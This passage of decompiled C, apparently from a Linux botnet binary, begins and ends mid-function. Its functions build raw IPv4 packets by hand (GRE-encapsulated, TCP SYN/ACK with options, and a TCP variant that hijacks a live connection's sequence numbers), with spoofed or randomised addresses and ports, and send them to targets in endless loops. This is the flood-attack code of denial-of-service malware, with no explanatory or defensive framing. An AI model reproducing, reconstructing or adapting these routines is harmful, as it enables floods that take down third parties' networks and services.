          *(undefined4 *)(puVar1 + 2) = *(undefined4 *)(iVar3 + 0x10);
          *puVar1 = 2;
          puVar1[1] = 0;
          FUN_08052788(iVar17,iVar3,iVar15 + 0x42,0x4000,puVar1,0x10);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar21);
      } while( true );
    }
    FUN_08053125(iVar17);
  }
  return;
}



void FUN_0804adb0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined2 *puVar1;
  undefined *puVar2;
  int iVar3;
  undefined uVar4;
  undefined uVar5;
  char cVar6;
  char cVar7;
  char cVar8;
  ushort uVar9;
  short sVar10;
  ushort uVar11;
  undefined2 uVar12;
  short sVar13;
  uint uVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  int iVar19;
  uint uVar20;
  undefined4 uVar21;
  int iVar22;
  int iVar23;
  undefined4 uVar24;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  int local_14;
  
  uVar14 = (uint)param_1;
  iVar15 = FUN_08051070(uVar14,4);
  uVar4 = FUN_0804a420(param_3,param_4,2,0);
  uVar9 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar5 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar6 = FUN_0804a420(param_3,param_4,5,1);
  sVar10 = FUN_0804a420(param_3,param_4,6,0xffff);
  uVar11 = FUN_0804a420(param_3,param_4,7,0xffff);
  iVar16 = FUN_0804a420(param_3,param_4,0,0x200);
  cVar7 = FUN_0804a420(param_3,param_4,1,1);
  cVar8 = FUN_0804a420(param_3,param_4,0x13,0);
  iVar17 = FUN_0804a420(param_3,param_4,0x19,DAT_0805569c);
  iVar18 = FUN_08052834(2,3,6);
  if (iVar18 != -1) {
    local_14 = 1;
    iVar19 = FUN_080527e0(iVar18,0,3,&local_14,4);
    if (iVar19 != -1) {
      local_14 = 0;
      uVar21 = extraout_ECX;
      if (param_1 != 0) {
        uVar20 = (uint)uVar11;
        do {
          iVar19 = local_14;
          uVar21 = FUN_08051070(0x5e6,4,uVar20,uVar20);
          *(undefined4 *)(iVar15 + iVar19 * 4) = uVar21;
          puVar2 = *(undefined **)(iVar15 + local_14 * 4);
          *puVar2 = 0x45;
          puVar2[1] = uVar4;
          uVar12 = FUN_08052544(iVar16 + 0x34U & 0xffff);
          *(undefined2 *)(puVar2 + 2) = uVar12;
          uVar12 = FUN_08052544(uVar9);
          puVar2[8] = uVar5;
          *(undefined2 *)(puVar2 + 4) = uVar12;
          if (cVar6 != '\0') {
            uVar12 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar2 + 6) = uVar12;
          }
          puVar2[9] = 0x2f;
          *(int *)(puVar2 + 0xc) = iVar17;
          *(undefined4 *)(puVar2 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar12 = FUN_08052544(0x800);
          *(undefined2 *)(puVar2 + 0x16) = uVar12;
          puVar2[0x18] = 0x45;
          puVar2[0x19] = uVar4;
          uVar12 = FUN_08052544(iVar16 + 0x1cU & 0xffff);
          *(undefined2 *)(puVar2 + 0x1a) = uVar12;
          uVar12 = FUN_08052544(uVar9 ^ 0xffff);
          puVar2[0x20] = uVar5;
          *(undefined2 *)(puVar2 + 0x1c) = uVar12;
          if (cVar6 != '\0') {
            uVar12 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar2 + 0x1e) = uVar12;
          }
          puVar2[0x21] = 0x11;
          iVar19 = FUN_0804f450();
          *(int *)(puVar2 + 0x24) = iVar19;
          if (cVar8 == '\0') {
            *(uint *)(puVar2 + 0x28) = iVar19 - 0x400U ^ 0xffffffff;
          }
          else {
            *(undefined4 *)(puVar2 + 0x28) = *(undefined4 *)(puVar2 + 0x10);
          }
          uVar12 = FUN_08052544(sVar10);
          *(undefined2 *)(puVar2 + 0x2c) = uVar12;
          uVar12 = FUN_08052544((uint)uVar11);
          *(undefined2 *)(puVar2 + 0x2e) = uVar12;
          uVar20 = FUN_08052544(iVar16 + 8U & 0xffff);
          local_14 = local_14 + 1;
          *(short *)(puVar2 + 0x30) = (short)uVar20;
          uVar21 = extraout_ECX_00;
        } while (local_14 < (int)uVar14);
      }
      iVar22 = iVar16 + 8;
      iVar19 = iVar16 + 0x34;
      do {
        do {
          local_14 = 0;
        } while (param_1 == 0);
        do {
          iVar3 = *(int *)(iVar15 + local_14 * 4);
          iVar23 = param_2 + local_14 * 0x18;
          if (*(byte *)(iVar23 + 0x14) < 0x20) {
            iVar23 = FUN_080526b8(*(undefined4 *)(iVar23 + 0x10));
            uVar20 = FUN_0804f450();
            uVar21 = FUN_08052518((uVar20 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar23);
            *(undefined4 *)(iVar3 + 0x10) = uVar21;
            uVar21 = extraout_ECX_02;
            if (iVar17 == -1) goto LAB_0804b283;
LAB_0804b14d:
            if (uVar9 != 0xffff) goto LAB_0804b159;
LAB_0804b297:
            sVar13 = FUN_0804f450(iVar19,iVar22);
            *(short *)(iVar3 + 4) = sVar13;
            *(ushort *)(iVar3 + 0x1c) = sVar13 - 1000U ^ 0xffff;
            uVar21 = extraout_ECX_04;
            if (sVar10 == -1) goto LAB_0804b2b8;
LAB_0804b165:
            if (uVar11 != 0xffff) goto LAB_0804b171;
LAB_0804b2cd:
            uVar12 = FUN_0804f450();
            *(undefined2 *)(iVar3 + 0x2e) = uVar12;
            uVar21 = extraout_ECX_06;
            if (cVar8 == '\0') goto LAB_0804b2e1;
LAB_0804b17c:
            uVar24 = *(undefined4 *)(iVar3 + 0x10);
            *(undefined4 *)(iVar3 + 0x28) = uVar24;
          }
          else {
            if (iVar17 != -1) goto LAB_0804b14d;
LAB_0804b283:
            uVar21 = FUN_0804f450(iVar19,iVar22);
            *(undefined4 *)(iVar3 + 0xc) = uVar21;
            uVar21 = extraout_ECX_03;
            if (uVar9 == 0xffff) goto LAB_0804b297;
LAB_0804b159:
            if (sVar10 != -1) goto LAB_0804b165;
LAB_0804b2b8:
            uVar12 = FUN_0804f450();
            *(undefined2 *)(iVar3 + 0x2c) = uVar12;
            uVar21 = extraout_ECX_05;
            if (uVar11 == 0xffff) goto LAB_0804b2cd;
LAB_0804b171:
            if (cVar8 != '\0') goto LAB_0804b17c;
LAB_0804b2e1:
            uVar24 = FUN_0804f450();
            *(undefined4 *)(iVar3 + 0x28) = uVar24;
            uVar21 = extraout_ECX_07;
          }
          if (cVar7 != '\0') {
            FUN_0804f5e0(iVar3 + 0x34,iVar16,uVar24,uVar24);
            uVar21 = extraout_ECX_08;
          }
          *(undefined2 *)(iVar3 + 10) = 0;
          uVar12 = FUN_0804d7a0(iVar3,0x14,uVar21,uVar21);
          *(undefined2 *)(iVar3 + 10) = uVar12;
          *(undefined2 *)(iVar3 + 0x22) = 0;
          uVar12 = FUN_0804d7a0(iVar3 + 0x18,0x14);
          *(undefined2 *)(iVar3 + 0x22) = uVar12;
          *(undefined2 *)(iVar3 + 0x32) = 0;
          uVar12 = FUN_0804d7f0(iVar3 + 0x18,iVar3 + 0x2c,*(undefined2 *)(iVar3 + 0x30),iVar22);
          *(undefined2 *)(iVar3 + 0x32) = uVar12;
          puVar1 = (undefined2 *)(param_2 + local_14 * 0x18);
          *(undefined4 *)(puVar1 + 2) = *(undefined4 *)(iVar3 + 0x10);
          *puVar1 = 2;
          puVar1[1] = 0;
          FUN_08052788(iVar18,iVar3,iVar19,0x4000,puVar1,0x10);
          local_14 = local_14 + 1;
          uVar21 = extraout_ECX_01;
        } while (local_14 < (int)uVar14);
      } while( true );
    }
    FUN_08053125(iVar18);
  }
  return;
}



void FUN_0804b330(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined *puVar1;
  undefined uVar2;
  undefined uVar3;
  char cVar4;
  byte bVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  char cVar11;
  short sVar12;
  undefined2 uVar13;
  uint uVar14;
  int iVar15;
  int iVar16;
  undefined *puVar17;
  int iVar18;
  int iVar19;
  int iVar20;
  uint uVar21;
  uint uVar22;
  undefined4 uVar23;
  int iVar24;
  int iVar25;
  int extraout_ECX;
  int extraout_ECX_00;
  undefined *puVar26;
  int local_16c;
  undefined local_138 [20];
  undefined4 local_124;
  byte local_117;
  undefined local_38 [4];
  int local_34;
  undefined2 local_28;
  short local_26;
  int local_24;
  undefined4 local_18;
  uint local_14;
  
  uVar14 = (uint)param_1;
  iVar15 = FUN_08051070(uVar14,0x10);
  iVar16 = FUN_08051070(uVar14,4);
  uVar2 = FUN_0804a420(param_3,param_4,2,0);
  puVar17 = (undefined *)FUN_0804a420(param_3,param_4,3,0xffff);
  uVar3 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar4 = FUN_0804a420(param_3,param_4,5,1);
  sVar12 = FUN_0804a420(param_3,param_4,7,0xffff);
  bVar5 = FUN_0804a420(param_3,param_4,0xb,0);
  bVar6 = FUN_0804a420(param_3,param_4,0xc,1);
  bVar7 = FUN_0804a420(param_3,param_4,0xd,1);
  bVar8 = FUN_0804a420(param_3,param_4,0xe,0);
  bVar9 = FUN_0804a420(param_3,param_4,0xf,0);
  bVar10 = FUN_0804a420(param_3,param_4,0x10,0);
  iVar18 = FUN_0804a420(param_3,param_4,0,0x300);
  cVar11 = FUN_0804a420(param_3,param_4,1,1);
  iVar19 = FUN_08052834(2,3,6);
  if (iVar19 != -1) {
    local_14 = 1;
    iVar20 = FUN_080527e0(iVar19,0,3,&local_14,4);
    if (iVar20 != -1) {
      local_14 = 0;
      if (param_1 != 0) {
        uVar21 = iVar18 + 0x28U & 0xffff;
        uVar22 = uVar21;
        puVar26 = puVar17;
LAB_0804b4e0:
        do {
          iVar20 = FUN_08052834(2,1,0,uVar22);
          if (iVar20 != -1) {
            uVar22 = FUN_08050d80(iVar20,3,0,iVar20);
            FUN_08050d80(iVar20,4,uVar22 | 0x800);
            local_28 = 2;
            iVar25 = param_2 + local_14 * 0x18;
            if (*(byte *)(iVar25 + 0x14) < 0x20) {
              iVar25 = FUN_080526b8(*(undefined4 *)(iVar25 + 0x10));
              uVar22 = FUN_0804f450();
              local_24 = FUN_08052518((uVar22 >>
                                      (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) + iVar25
                                     );
              if (sVar12 == -1) goto LAB_0804b6b0;
LAB_0804b555:
              uVar23 = FUN_08052544(sVar12);
              local_26 = (short)uVar23;
            }
            else {
              local_24 = *(int *)(iVar25 + 0x10);
              if (sVar12 != -1) goto LAB_0804b555;
LAB_0804b6b0:
              uVar23 = FUN_0804f450();
              local_26 = (short)uVar23;
            }
            FUN_08052418(iVar20,&local_28,0x10,uVar23);
            iVar24 = FUN_080530dc(0);
            iVar25 = iVar24;
            do {
              local_18 = 0x10;
              uVar22 = FUN_08052710(iVar19,local_138,0x100,0x4000,local_38,&local_18,iVar25,iVar25);
              if (uVar22 == 0xffffffff) {
                return;
              }
              if (((local_34 == local_24) && (0x28 < uVar22)) && ((short)local_124 == local_26)) {
                if ((local_117 & 0x12) == 0x12) {
                  iVar20 = local_14 * 0x10;
                  *(int *)(iVar20 + iVar15) = local_24;
                  uVar23 = FUN_080526b8(*(undefined4 *)(puVar26 + 4));
                  *(undefined4 *)(iVar20 + iVar15 + 4) = uVar23;
                  iVar20 = local_14 * 0x10;
                  uVar23 = FUN_080526b8(*(undefined4 *)(puVar26 + 8));
                  *(undefined4 *)(iVar20 + iVar15 + 8) = uVar23;
                  *(undefined2 *)(local_14 * 0x10 + 0xc + iVar15) = *(undefined2 *)(puVar26 + 2);
                  *(short *)(local_14 * 0x10 + 0xe + iVar15) = local_26;
                  iVar20 = local_14 * 4;
                  uVar23 = FUN_080519b0(iVar18 + 0x28);
                  *(undefined4 *)(iVar16 + iVar20) = uVar23;
                  puVar1 = *(undefined **)(iVar16 + local_14 * 4);
                  *puVar1 = 0x45;
                  puVar26 = puVar1 + 0x14;
                  puVar1[1] = uVar2;
                  uVar13 = FUN_08052544(uVar21);
                  *(undefined2 *)(puVar1 + 2) = uVar13;
                  uVar13 = FUN_08052544((uint)puVar17 & 0xffff);
                  *(undefined2 *)(puVar1 + 4) = uVar13;
                  puVar1[8] = uVar3;
                  if (cVar4 != '\0') {
                    uVar13 = FUN_08052544(0x4000);
                    *(undefined2 *)(puVar1 + 6) = uVar13;
                  }
                  puVar1[9] = 6;
                  *(undefined4 *)(puVar1 + 0xc) = DAT_0805569c;
                  iVar20 = local_14 * 0x10;
                  *(undefined4 *)(puVar1 + 0x10) = *(undefined4 *)(iVar20 + iVar15);
                  *(short *)(puVar1 + 0x14) = (short)*(undefined4 *)(iVar20 + 0xc + iVar15);
                  *(undefined2 *)(puVar1 + 0x16) = *(undefined2 *)(iVar20 + 0xe + iVar15);
                  *(undefined4 *)(puVar1 + 0x18) = *(undefined4 *)(iVar20 + 8 + iVar15);
                  *(undefined4 *)(puVar1 + 0x1c) = *(undefined4 *)(iVar20 + 4 + iVar15);
                  puVar1[0x21] = puVar1[0x21] | 0x11;
                  puVar1[0x20] = puVar1[0x20] & 0xf | 0x80;
                  uVar23 = FUN_0804f450();
                  *(short *)(puVar1 + 0x22) = (short)uVar23;
                  uVar22 = CONCAT31((int3)((uint)uVar23 >> 8),puVar1[0x21]) & 0xffffffc0 |
                           (bVar5 & 1) << 5 | (bVar6 & 1) << 4 | (bVar7 & 1) << 3 | (bVar8 & 1) << 2
                           | (bVar9 & 1) * 2 | bVar10 & 1;
                  puVar1[0x21] = (char)uVar22;
                  FUN_0804f5e0(puVar1 + 0x28,iVar18,uVar22,uVar22);
                  goto LAB_0804b85f;
                }
                if ((local_117 & 5) != 0) {
                  uVar22 = FUN_08053125(iVar20);
                  goto LAB_0804b4e0;
                }
              }
              iVar25 = FUN_080530dc(0);
              iVar25 = iVar25 - iVar24;
            } while (iVar25 < 0xb);
            uVar22 = FUN_08053125(iVar20);
            goto LAB_0804b4e0;
          }
LAB_0804b85f:
          uVar22 = local_14 + 1;
          local_14 = uVar22;
        } while ((int)uVar22 < (int)uVar14);
      }
      local_16c = iVar18 + 0x14;
      do {
        do {
          local_14 = 0;
        } while (param_1 == 0);
        do {
          iVar20 = *(int *)(iVar16 + local_14 * 4);
          uVar22 = local_14;
          iVar25 = iVar16;
          if ((short)puVar17 == -1) {
            uVar22 = FUN_0804f450();
            *(short *)(iVar20 + 4) = (short)uVar22;
            iVar25 = extraout_ECX_00;
          }
          if (cVar11 != '\0') {
            FUN_0804f5e0(iVar20 + 0x28,iVar18,uVar22,uVar22);
            iVar25 = extraout_ECX;
          }
          *(undefined2 *)(iVar20 + 10) = 0;
          uVar13 = FUN_0804d7a0(iVar20,0x14,iVar25,iVar25);
          *(undefined2 *)(iVar20 + 10) = uVar13;
          iVar25 = local_14 * 0x10 + iVar15;
          uVar22 = *(uint *)(iVar25 + 4);
          *(uint *)(iVar25 + 4) = uVar22 + 1;
          uVar22 = FUN_08052544(uVar22 & 0xffff);
          *(uint *)(iVar20 + 0x18) = uVar22 & 0xffff;
          uVar22 = FUN_08052544(*(uint *)(iVar15 + 8 + local_14 * 0x10) & 0xffff);
          *(undefined2 *)(iVar20 + 0x24) = 0;
          *(uint *)(iVar20 + 0x1c) = uVar22 & 0xffff;
          uVar13 = FUN_08052544(iVar18 + 0x14U & 0xffff);
          uVar13 = FUN_0804d7f0(iVar20,iVar20 + 0x14,uVar13,local_16c);
          *(undefined2 *)(iVar20 + 0x24) = uVar13;
          *(undefined2 *)(local_14 * 0x18 + 2 + param_2) = *(undefined2 *)(iVar20 + 0x16);
          FUN_08052788(iVar19,iVar20,iVar18 + 0x28,0x4000,local_14 * 0x18 + param_2,0x10);
          local_14 = local_14 + 1;
        } while ((int)local_14 < (int)uVar14);
      } while( true );
    }
    FUN_08053125(iVar19);
  }
  return;
}



// WARNING: Type propagation algorithm not settling

void FUN_0804b9f0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined *puVar1;
  int iVar2;
  undefined uVar3;
  undefined uVar4;
  char cVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  char cVar10;
  byte bVar11;
  short sVar12;
  short sVar13;
  short sVar14;
  undefined2 uVar15;
  uint uVar16;
  int iVar17;
  uint uVar18;
  int iVar19;
  uint uVar20;
  uint uVar21;
  int iVar22;
  int iVar23;
  int iVar24;
  int iVar25;
  undefined4 uVar26;
  int local_14;
  
  uVar16 = (uint)param_1;
  iVar17 = FUN_08051070(uVar16,4);
  uVar3 = FUN_0804a420(param_3,param_4,2,0);
  sVar12 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar4 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar5 = FUN_0804a420(param_3,param_4,5,0);
  sVar13 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar14 = FUN_0804a420(param_3,param_4,7,0xffff);
  uVar18 = FUN_0804a420(param_3,param_4,0x11,0xffff);
  iVar19 = FUN_0804a420(param_3,param_4,0x12,0xffff);
  uVar20 = FUN_0804a420(param_3,param_4,0xb,0);
  uVar21 = FUN_0804a420(param_3,param_4,0xc,1);
  bVar6 = FUN_0804a420(param_3,param_4,0xd,0);
  bVar7 = FUN_0804a420(param_3,param_4,0xe,0);
  bVar8 = FUN_0804a420(param_3,param_4,0xf,0);
  bVar9 = FUN_0804a420(param_3,param_4,0x10,0);
  iVar22 = FUN_0804a420(param_3,param_4,0,0x200);
  cVar10 = FUN_0804a420(param_3,param_4,1,1);
  iVar23 = FUN_0804a3b0(param_3,param_4,0x19,DAT_0805569c);
  iVar24 = FUN_08052834(2,3,6);
  if (iVar24 != -1) {
    local_14 = 1;
    iVar25 = FUN_080527e0(iVar24,0,3,&local_14,4);
    if (iVar25 != -1) {
      local_14 = 0;
      if (param_1 != 0) {
        iVar25 = (uVar20 & 1) << 5;
        bVar11 = (byte)iVar25;
        do {
          iVar2 = local_14;
          uVar26 = FUN_08051070(0x5e6,1,iVar25,iVar25);
          *(undefined4 *)(iVar17 + iVar2 * 4) = uVar26;
          puVar1 = *(undefined **)(iVar17 + local_14 * 4);
          *puVar1 = 0x45;
          puVar1[1] = uVar3;
          uVar15 = FUN_08052544(iVar22 + 0x28U & 0xffff);
          *(undefined2 *)(puVar1 + 2) = uVar15;
          uVar15 = FUN_08052544(sVar12);
          puVar1[8] = uVar4;
          *(undefined2 *)(puVar1 + 4) = uVar15;
          if (cVar5 != '\0') {
            uVar15 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar1 + 6) = uVar15;
          }
          puVar1[9] = 6;
          *(int *)(puVar1 + 0xc) = iVar23;
          *(undefined4 *)(puVar1 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar15 = FUN_08052544(sVar13);
          *(undefined2 *)(puVar1 + 0x14) = uVar15;
          uVar15 = FUN_08052544(sVar14);
          *(undefined2 *)(puVar1 + 0x16) = uVar15;
          uVar20 = FUN_08052544(uVar18 & 0xffff);
          *(uint *)(puVar1 + 0x18) = uVar20 & 0xffff;
          puVar1[0x20] = puVar1[0x20] & 0xf | 0x50;
          puVar1[0x21] = puVar1[0x21] & 0xc0 | bVar11 | (byte)((uVar21 & 1) << 4) | (bVar6 & 1) << 3
                         | (bVar7 & 1) << 2 | (bVar8 & 1) * '\x02' | bVar9 & 1;
          uVar26 = FUN_0804f450();
          *(short *)(puVar1 + 0x22) = (short)uVar26;
          if (bVar6 != 0) {
            puVar1[0x21] = puVar1[0x21] | 8;
          }
          iVar25 = FUN_0804f5e0(puVar1 + 0x28,iVar22,uVar26,uVar26);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar16);
      }
      do {
        do {
          local_14 = 0;
        } while (param_1 == 0);
        do {
          iVar2 = *(int *)(iVar17 + local_14 * 4);
          iVar25 = param_2 + local_14 * 0x18;
          if (*(byte *)(iVar25 + 0x14) < 0x20) {
            iVar25 = FUN_080526b8(*(undefined4 *)(iVar25 + 0x10));
            uVar20 = FUN_0804f450();
            iVar25 = FUN_08052518((uVar20 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar25);
            *(int *)(iVar2 + 0x10) = iVar25;
          }
          if (iVar23 == -1) {
            iVar25 = FUN_0804f450();
            *(int *)(iVar2 + 0xc) = iVar25;
          }
          if (sVar12 == -1) {
            iVar25 = FUN_0804f450();
            *(short *)(iVar2 + 4) = (short)iVar25;
          }
          if (sVar13 == -1) {
            iVar25 = FUN_0804f450();
            *(short *)(iVar2 + 0x14) = (short)iVar25;
          }
          if (sVar14 == -1) {
            iVar25 = FUN_0804f450();
            *(short *)(iVar2 + 0x16) = (short)iVar25;
          }
          if (uVar18 == 0xffff) {
            iVar25 = FUN_0804f450();
            *(int *)(iVar2 + 0x18) = iVar25;
          }
          if (iVar19 == 0xffff) {
            iVar25 = FUN_0804f450();
            *(int *)(iVar2 + 0x1c) = iVar25;
          }
          if (cVar10 != '\0') {
            iVar25 = FUN_0804f5e0(iVar2 + 0x28,iVar22,iVar25,iVar25);
          }
          *(undefined2 *)(iVar2 + 10) = 0;
          uVar15 = FUN_0804d7a0(iVar2,0x14,iVar25,iVar25);
          *(undefined2 *)(iVar2 + 10) = uVar15;
          *(undefined2 *)(iVar2 + 0x24) = 0;
          uVar15 = FUN_08052544(iVar22 + 0x14U & 0xffff);
          uVar15 = FUN_0804d7f0(iVar2,iVar2 + 0x14,uVar15,iVar22 + 0x14);
          *(undefined2 *)(iVar2 + 0x24) = uVar15;
          iVar25 = param_2 + local_14 * 0x18;
          *(undefined2 *)(iVar25 + 2) = *(undefined2 *)(iVar2 + 0x16);
          FUN_08052788(iVar24,iVar2,iVar22 + 0x28,0x4000,iVar25,0x10);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar16);
      } while( true );
    }
    FUN_08053125(iVar24);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0804c4dc)
// WARNING: Type propagation algorithm not settling

void FUN_0804c000(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined *puVar1;
  int iVar2;
  undefined uVar3;
  undefined uVar4;
  char cVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  short sVar11;
  short sVar12;
  short sVar13;
  undefined2 uVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  uint uVar19;
  int iVar20;
  int iVar21;
  int iVar22;
  uint uVar23;
  undefined4 uVar24;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar25;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  undefined8 uVar26;
  int local_14;
  
  uVar15 = (uint)param_1;
  iVar16 = FUN_08051070(uVar15,4);
  uVar3 = FUN_0804a420(param_3,param_4,2,0);
  sVar11 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar4 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar5 = FUN_0804a420(param_3,param_4,5,1);
  sVar12 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar13 = FUN_0804a420(param_3,param_4,7,0xffff);
  uVar17 = FUN_0804a420(param_3,param_4,0x11,0xffff);
  iVar18 = FUN_0804a420(param_3,param_4,0x12,0);
  bVar6 = FUN_0804a420(param_3,param_4,0xb,0);
  uVar19 = FUN_0804a420(param_3,param_4,0xc,0);
  bVar7 = FUN_0804a420(param_3,param_4,0xd,0);
  bVar8 = FUN_0804a420(param_3,param_4,0xe,0);
  bVar9 = FUN_0804a420(param_3,param_4,0xf,1);
  bVar10 = FUN_0804a420(param_3,param_4,0x10,0);
  iVar20 = FUN_0804a3b0(param_3,param_4,0x19,DAT_0805569c);
  iVar21 = FUN_08052834(2,3,6);
  if (iVar21 != -1) {
    local_14 = 1;
    iVar22 = FUN_080527e0(iVar21,0,3,&local_14,4);
    if (iVar22 != -1) {
      local_14 = 0;
      if (param_1 != 0) {
        uVar24 = extraout_ECX;
        do {
          iVar22 = local_14;
          uVar24 = FUN_08051070(0x80,1,uVar24,uVar24);
          *(undefined4 *)(iVar16 + iVar22 * 4) = uVar24;
          puVar1 = *(undefined **)(iVar16 + local_14 * 4);
          *puVar1 = 0x45;
          puVar1[1] = uVar3;
          uVar14 = FUN_08052544(0x3c);
          *(undefined2 *)(puVar1 + 2) = uVar14;
          uVar14 = FUN_08052544(sVar11);
          puVar1[8] = uVar4;
          *(undefined2 *)(puVar1 + 4) = uVar14;
          if (cVar5 != '\0') {
            uVar14 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar1 + 6) = uVar14;
          }
          puVar1[9] = 6;
          *(int *)(puVar1 + 0xc) = iVar20;
          *(undefined4 *)(puVar1 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar14 = FUN_08052544(sVar12);
          *(undefined2 *)(puVar1 + 0x14) = uVar14;
          uVar14 = FUN_08052544(sVar13);
          *(undefined2 *)(puVar1 + 0x16) = uVar14;
          uVar23 = FUN_08052544(uVar17 & 0xffff);
          *(uint *)(puVar1 + 0x18) = uVar23 & 0xffff;
          puVar1[0x20] = puVar1[0x20] & 0xf | 0xa0;
          puVar1[0x21] = puVar1[0x21] & 0xc0 | (bVar6 & 1) << 5 | (byte)((uVar19 & 1) << 4) |
                         (bVar7 & 1) << 3 | (bVar8 & 1) << 2 | (bVar9 & 1) * '\x02' | bVar10 & 1;
          puVar1[0x28] = 2;
          puVar1[0x29] = 4;
          uVar23 = FUN_0804f450();
          uVar14 = FUN_08052544((uVar23 & 0xf) + 0x578);
          puVar1[0x2c] = 4;
          *(undefined2 *)(puVar1 + 0x2a) = uVar14;
          puVar1[0x2d] = 2;
          puVar1[0x2e] = 8;
          puVar1[0x2f] = 10;
          uVar24 = FUN_0804f450();
          puVar1[0x38] = 1;
          puVar1[0x39] = 3;
          puVar1[0x3a] = 3;
          puVar1[0x3b] = 6;
          *(undefined4 *)(puVar1 + 0x30) = uVar24;
          *(undefined4 *)(puVar1 + 0x34) = 0;
          local_14 = local_14 + 1;
          uVar24 = extraout_ECX_00;
        } while (local_14 < (int)uVar15);
      }
      do {
        do {
        } while (param_1 == 0);
        local_14 = 0;
        do {
          iVar2 = *(int *)(iVar16 + local_14 * 4);
          iVar22 = param_2 + local_14 * 0x18;
          iVar25 = param_2;
          if (*(byte *)(iVar22 + 0x14) < 0x20) {
            iVar22 = FUN_080526b8(*(undefined4 *)(iVar22 + 0x10));
            uVar19 = FUN_0804f450();
            uVar26 = FUN_08052518((uVar19 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar22);
            *(int *)(iVar2 + 0x10) = (int)uVar26;
            iVar25 = (int)((ulonglong)uVar26 >> 0x20);
          }
          if (iVar20 == -1) {
            uVar26 = FUN_0804f450();
            iVar25 = (int)((ulonglong)uVar26 >> 0x20);
            *(int *)(iVar2 + 0xc) = (int)uVar26;
          }
          if (sVar11 == -1) {
            uVar14 = FUN_0804f450();
            *(undefined2 *)(iVar2 + 4) = uVar14;
            iVar25 = extraout_EDX_00;
          }
          if (sVar12 == -1) {
            uVar14 = FUN_0804f450();
            *(undefined2 *)(iVar2 + 0x14) = uVar14;
            iVar25 = extraout_EDX_01;
          }
          if (sVar13 == -1) {
            uVar14 = FUN_0804f450();
            *(undefined2 *)(iVar2 + 0x16) = uVar14;
            iVar25 = extraout_EDX_02;
          }
          if (uVar17 == 0xffff) {
            uVar26 = FUN_0804f450();
            iVar25 = (int)((ulonglong)uVar26 >> 0x20);
            *(int *)(iVar2 + 0x18) = (int)uVar26;
          }
          if (iVar18 == 0xffff) {
            uVar26 = FUN_0804f450();
            iVar25 = (int)((ulonglong)uVar26 >> 0x20);
            *(int *)(iVar2 + 0x1c) = (int)uVar26;
          }
          if (bVar6 != 0) {
            uVar14 = FUN_0804f450();
            *(undefined2 *)(iVar2 + 0x26) = uVar14;
            iVar25 = extraout_EDX;
          }
          *(undefined2 *)(iVar2 + 10) = 0;
          uVar14 = FUN_0804d7a0(iVar2,0x14,iVar25,iVar25);
          *(undefined2 *)(iVar2 + 10) = uVar14;
          *(undefined2 *)(iVar2 + 0x24) = 0;
          uVar14 = FUN_08052544(0x28);
          uVar14 = FUN_0804d7f0(iVar2,iVar2 + 0x14,uVar14,0x28);
          *(undefined2 *)(iVar2 + 0x24) = uVar14;
          iVar22 = param_2 + local_14 * 0x18;
          *(undefined2 *)(iVar22 + 2) = *(undefined2 *)(iVar2 + 0x16);
          FUN_08052788(iVar21,iVar2,0x3c,0x4000,iVar22,0x10);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar15);
      } while( true );
    }
    FUN_08053125(iVar21);
  }
  return;
}



void FUN_0804c5d0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  int iVar1;
  char cVar2;
  short sVar3;
  short sVar4;
  undefined2 uVar5;
  undefined2 uVar6;
  undefined2 uVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  uint uVar12;
  undefined4 uVar13;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint uVar14;
  int local_34;
  uint local_28;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  
  uVar14 = (uint)param_1;
  iVar8 = FUN_08051070(uVar14,4);
  iVar9 = FUN_08051070(uVar14,4);
  sVar3 = FUN_0804a420(param_3,param_4,7,0xffff);
  sVar4 = FUN_0804a420(param_3,param_4,6,0xffff);
